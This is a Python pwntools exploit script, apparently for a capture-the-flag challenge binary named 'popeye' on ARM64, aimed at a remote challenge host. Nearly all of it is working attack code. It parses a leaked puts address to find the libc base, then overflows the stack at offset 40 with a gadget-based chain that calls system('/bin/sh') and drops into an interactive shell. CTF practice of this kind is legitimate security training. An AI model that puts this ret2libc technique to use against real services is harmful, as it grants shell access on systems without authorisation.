#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './popeye'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-arm.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.airoverflow.com', 33479

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x400980
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec popeye
#     Arch:     aarch64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x3f0000)
#     RUNPATH:  b'.'

def exploit():
    global io
    io = initialize()

    io.recvuntil(b'r: ')
    puts = int(io.recvuntil(b']', drop=True), 16)
    libc.address = puts - libc.sym['puts']

    offset = 40
    payload = flat({
        offset: [
            libc.address + 0x69500, # ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
        ]
    })
    payload += cyclic(8)
    payload += p64(libc.sym['system'])
    payload += cyclic(8)
    payload += p64(next(libc.search(b'/bin/sh\x00')))

    io.sendline(payload)

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()